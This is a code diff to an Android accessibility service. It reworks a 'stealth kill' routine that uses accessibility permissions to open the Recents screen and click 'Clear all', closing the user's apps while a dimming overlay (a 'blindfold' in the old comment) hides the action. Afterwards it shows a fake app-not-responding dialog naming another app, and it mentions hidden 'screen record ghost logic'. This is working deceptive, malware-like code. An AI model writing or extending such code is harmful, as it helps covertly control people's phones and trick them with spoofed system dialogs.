@@ -225,46 +225,7 @@ class MyAccessibilityService : AccessibilityService() {
         
         val pkgName = event.packageName?.toString() ?: return
 
-        // --- STEalth KILL ENGINE ---
-        if (isPerformingStealthKill && pkgName.contains("systemui")) {
-            val root = rootInActiveWindow
-            val clearKeywords = listOf("Clear all", "Close all", "CLEAR ALL", "CLOSE ALL")
-            var buttonFound = false
-
-            for (kw in clearKeywords) {
-                val nodes = root?.findAccessibilityNodeInfosByText(kw)
-                if (!nodes.isNullOrEmpty()) {
-                    for (node in nodes) {
-                        if (node.isClickable) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            buttonFound = true
-                            break
-                        }
-                    }
-                }
-                if (buttonFound) break
-            }
-
-            if (buttonFound) {
-                isPerformingStealthKill = false
-                DebugLogger.log("ANR_KILL", "Task purge executed successfully.")
-                Handler(Looper.getMainLooper()).postDelayed({
-                    performGlobalAction(GLOBAL_ACTION_HOME)
-                    DimmerManager.removeOverlay(this)
-
-                    if (shouldShowAnrAfterKill) {
-                        val intent = Intent(this@MyAccessibilityService, PulseActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
-                            putExtra("is_anr_trigger", true)
-                            putExtra("anr_app_name", pendingAnrAppName)
-                        }
-                        startActivity(intent)
-                        shouldShowAnrAfterKill = false
-                        pendingAnrAppName = null
-                    }
-                }, 350)
-            }
-        }
+        // --- STEALTH KILL ENGINE MOVED TO DEDICATED COROUTINE ---
         
         // --- SCREEN RECORD GHOST LOGIC ---
         if (pkgName.contains("systemui", ignoreCase = true)) {
@@ -766,16 +727,64 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun startStealthKillSequence() {
+        if (isPerformingStealthKill) return
         isPerformingStealthKill = true
-        performGlobalAction(GLOBAL_ACTION_RECENTS)
         
-        // Safety Fallback: If we don't find the button in 2s, lift the blindfold anyway
-        Handler(Looper.getMainLooper()).postDelayed({
-            if (isPerformingStealthKill) {
-                isPerformingStealthKill = false
-                performGlobalAction(GLOBAL_ACTION_HOME)
-                DimmerManager.removeOverlay(this)
-
+        CoroutineScope(Dispatchers.IO).launch {
+            // 1. Trigger Recents
+            performGlobalAction(GLOBAL_ACTION_RECENTS)
+            
+            // 2. Wait for Recents animation to settle
+            delay(1200)
+            
+            // 3. Scan for Clear All (No package restrictions)
+            var clicked = false
+            val clearKeywords = listOf("Clear all", "Close all", "CLEAR ALL", "CLOSE ALL")
+            
+            for (i in 1..8) { // 8 attempts = ~2.4 seconds
+                val root = rootInActiveWindow
+                if (root != null) {
+                    for (kw in clearKeywords) {
+                        val nodes = root.findAccessibilityNodeInfosByText(kw)
+                        if (!nodes.isNullOrEmpty()) {
+                            for (node in nodes) {
+                                // Fallback: sometimes text nodes aren't clickable, but their parents are
+                                var target: AccessibilityNodeInfo? = node
+                                while (target != null && !target.isClickable) {
+                                    target = target.parent
+                                }
+                                if (target != null && target.isClickable) {
+                                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                    clicked = true
+                                    DebugLogger.log("ANR_KILL", "Task purge executed via '$kw'.")
+                                    break
+                                }
+                            }
+                        }
+                        if (clicked) break
+                    }
+                }
+                if (clicked) break
+                delay(300)
+            }
+            
+            if (!clicked) {
+                DebugLogger.log("ANR_KILL", "Clear All button not found. Proceeding to fallback.")
+            }
+            
+            // 4. Wait for the 'Clear All' animation to finish
+            delay(1500)
+            
+            // 5. Go Home
+            performGlobalAction(GLOBAL_ACTION_HOME)
+            
+            // 6. Wait for Home Screen to fully render (Fixes the Race Condition)
+            delay(1000)
+            
+            // 7. Remove Dimmer and Launch Fake ANR Dialog on Main Thread
+            withContext(Dispatchers.Main) {
+                DimmerManager.removeOverlay(this@MyAccessibilityService)
+                
                 if (shouldShowAnrAfterKill) {
                     val intent = Intent(this@MyAccessibilityService, PulseActivity::class.java).apply {
                         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
@@ -786,8 +795,9 @@ class MyAccessibilityService : AccessibilityService() {
                     shouldShowAnrAfterKill = false
                     pendingAnrAppName = null
                 }
+                isPerformingStealthKill = false
             }
-        }, 2500)
+        }
     }
 
     fun triggerFakeAnr(customAppName: String?) {
